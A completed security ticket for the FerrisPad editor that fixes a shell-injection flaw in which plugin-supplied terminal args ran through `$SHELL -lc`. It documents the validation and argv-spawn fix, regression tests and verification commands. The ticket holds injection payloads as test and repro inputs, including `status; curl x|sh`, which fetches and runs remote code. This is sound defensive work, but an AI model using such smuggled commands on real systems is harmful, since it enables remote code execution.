---
id: T0001
title: Validate terminal_view args & working_dir to close the shell-injection RCE
status: done
created: 2026-08-24
severity: severe
area: security
depends-on: []
---

## Goal

A plugin that has been granted a single approved terminal command (e.g. `git`)
can currently run arbitrary shell code. `hook_dispatch.rs` validates only the
`command` name; the plugin-supplied `args` and `working_dir` are passed through
unchecked, and `pty.rs` concatenates program + args into one string and runs it
as `$SHELL -lc "<string>"`. So `command="git", args={"status; curl x|sh"}`
executes `curl x|sh`. This is full RCE from a minimally-privileged plugin and
is the single highest-impact finding of the audit. **Verified by reading the
code.**

## In scope

- Validate every element of `args` with the same rule already applied to the
  command name (`security::validate_command_arg`), in
  `controllers/hook_dispatch.rs` around the existing `terminal_view` block.
- Validate / sandbox `working_dir` (reject shell metacharacters; ideally
  confine it under the plugin's project root like the filesystem API does).
- Prefer the safe execution shape: stop wrapping plugin commands in
  `$SHELL -lc "<concatenated string>"`. Spawn the program directly with an
  argv array (as `api/commands.rs` already does), so args can never re-enter a
  shell parser.

## Out of scope

- The interactive terminal panel opened by the user themselves (command=None)
  — that path is already blocked for plugins and is user-initiated.
- Reworking the plugin permission/approval model (T0009 covers isolation).

## How to test

### Regression test

Add a test next to `controllers/hook_dispatch.rs` (or an integration test)
driving a `TerminalViewRequest` with `command="git"`,
`args=["status; touch /tmp/ferrispad_pwned"]`, approved_commands=["git"].

- Before the fix: the request is dispatched and (if wired to a real PTY in the
  test) the injected command runs / the args reach `pty.rs` unfiltered.
- After the fix: dispatch is rejected (toast + `eprintln` "invalid characters"),
  `/tmp/ferrispad_pwned` never created.

### Manual repro

Install a local plugin whose hook returns
`{terminal_view={title="t", command="git", args={"status; id > /tmp/x"}}}`,
approve `git`, trigger the hook. Before: `/tmp/x` appears. After: blocked.

## Acceptance criteria

- [x] `args` and `working_dir` are validated/sandboxed before any PTY spawn.
- [x] Plugin terminal commands no longer pass through `$SHELL -lc`.
- [x] Regression test added and green; it failed before the fix.
- [x] `cargo test` / `clippy` / `fmt` clean.

## Affected files

- `src/app/controllers/hook_dispatch.rs` — extracted all terminal_view security
  checks into a fail-closed `validate_terminal_request()` helper that now also
  validates every `arg` and an explicit `working_dir` via `validate_command_arg`.
- `src/app/services/terminal/pty.rs` — plugin path now spawns the program
  directly as an argv vector (`CommandBuilder::new(program)` + `c.arg(arg)`),
  dropping the `$SHELL -lc "<concatenated string>"` wrapping.
- `src/app/plugins/security.rs` — unchanged; `validate_command_arg` reused.

## Notes

- Origin: plugin/services audit **S3** (verified). Direct inconsistency with
  `api/commands.rs:84-100`, which already validates every arg and avoids a
  shell — mirrored that shape here.
- The login-shell wrapping was added to load the user's PATH from a desktop
  launch; if that matters for the *interactive* terminal keep it there, but the
  plugin-driven path must not use it.

## Outcome (2-review)

Two defensive layers, each with a red→green regression test:

1. **Validation gate** (`hook_dispatch.rs`). The scattered inline checks
   (command=None, command-name metacharacters, approved-list) were unified into
   one fail-closed `validate_terminal_request()` that additionally rejects
   metacharacters in **every arg** and in an explicit **working_dir**. Unit
   tests in `hook_dispatch::tests`; the three injection tests
   (`shell_injection_in_args_is_rejected`, `pipe_injection_in_args_is_rejected`,
   `shell_injection_in_working_dir_is_rejected`) **failed before** the arg/dir
   checks were added (helper returned `Ok`), pass after.
2. **Safe spawn shape** (`pty.rs`). The plugin path no longer builds
   `$SHELL -lc "<program + args>"`; it spawns the program as a real argv vector,
   so args can never re-enter a shell parser. `pty::tests`
   `plugin_command_args_do_not_reenter_a_shell` (`#[cfg(all(test, unix))]`)
   spawns `echo "hello; touch <marker>"` and asserts the marker is **not**
   created — it **was** created before the fix (RCE proven end-to-end), gone
   after.

Behaviour change: a blocked terminal_view now always shows an error toast to
the user (previously only the "not approved" case did; the metacharacter and
command=None cases were silent `eprintln`-only).

Working_dir confinement to the project root (the ticket's "ideally") was **not**
added: once the command spawns argv-directly, `working_dir` is a plain `chdir`
target (no shell parsing), and rejecting metacharacters there would break
legitimate paths (e.g. `My Project (2024)`) without closing an injection vector.
An explicit plugin-supplied working_dir is still metacharacter-gated; the
FerrisPad-discovered project-root default (set in `dispatch.rs`) is trusted and
unaffected.

### Verification recipe

```bash
# Both regression tests (each was red before its fix):
nix develop -c cargo test --lib hook_dispatch          # 7 pass incl. 3 injection
nix develop -c cargo test --lib pty::tests             # 1 pass (unix; no marker file)

# Full gates:
nix develop -c cargo test
nix develop -c cargo clippy --all-targets --all-features -- -D warnings
nix develop -c cargo fmt --check
```
